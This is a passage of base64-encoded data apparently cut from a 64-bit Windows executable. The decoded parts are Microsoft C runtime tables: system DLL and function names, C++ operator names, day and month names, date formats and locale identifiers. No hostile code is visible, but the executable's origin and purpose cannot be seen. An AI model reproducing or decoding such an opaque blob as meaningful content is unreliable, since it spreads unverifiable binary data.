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nVjdG9yIGl0ZXJhdG9yJwAAAAAAYHZpcnR1YWwgZGlzcGxhY2VtZW50IG1hcCcAAAAAAABgZWggdmVjdG9yIGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwAAAAAAAAAAYGVoIHZlY3RvciBkZXN0cnVjdG9yIGl0ZXJhdG9yJwBgZWggdmVjdG9yIHZiYXNlIGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwAAYGNvcHkgY29uc3RydWN0b3IgY2xvc3VyZScAAAAAAABgdWR0IHJldHVybmluZycAYEVIAGBSVFRJAAAAAAAAAGBsb2NhbCB2ZnRhYmxlJwBgbG9jYWwgdmZ0YWJsZSBjb25zdHJ1Y3RvciBjbG9zdXJlJwAgbmV3W10AAAAAAAAgZGVsZXRlW10AAAAAAAAAYG9tbmkgY2FsbHNpZycAAGBwbGFjZW1lbnQgZGVsZXRlIGNsb3N1cmUnAAAAAAAAYHBsYWNlbWVudCBkZWxldGVbXSBjbG9zdXJlJwAAAABgbWFuYWdlZCB2ZWN0b3IgY29uc3RydWN0b3IgaXRlcmF0b3InAAAAYG1hbmFnZWQgdmVjdG9yIGRlc3RydWN0b3IgaXRlcmF0b3InAAAAAGBlaCB2ZWN0b3IgY29weSBjb25zdHJ1Y3RvciBpdGVyYXRvcicAAABgZWggdmVjdG9yIHZiYXNlIGNvcHkgY29uc3RydWN0b3IgaXRlcmF0b3InAAAAAABgZHluYW1pYyBpbml0aWFsaXplciBmb3IgJwAAAAAAAGBkeW5hbWljIGF0ZXhpdCBkZXN0cnVjdG9yIGZvciAnAAAAAAAAAABgdmVjdG9yIGNvcHkgY29uc3RydWN0b3IgaXRlcmF0b3InAAAAAAAAYHZlY3RvciB2YmFzZSBjb3B5IGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwAAAAAAAAAAYG1hbmFnZWQgdmVjdG9yIGNvcHkgY29uc3RydWN0b3IgaXRlcmF0b3InAAAAAAAAYGxvY2FsIHN0YXRpYyB0aHJlYWQgZ3VhcmQnAAAAAABvcGVyYXRvciAiIiAAAAAAIFR5cGUgRGVzY3JpcHRvcicAAAAAAAAAIEJhc2UgQ2xhc3MgRGVzY3JpcHRvciBhdCAoAAAAAAAgQmFzZSBDbGFzcyBBcnJheScAAAAAAAAgQ2xhc3MgS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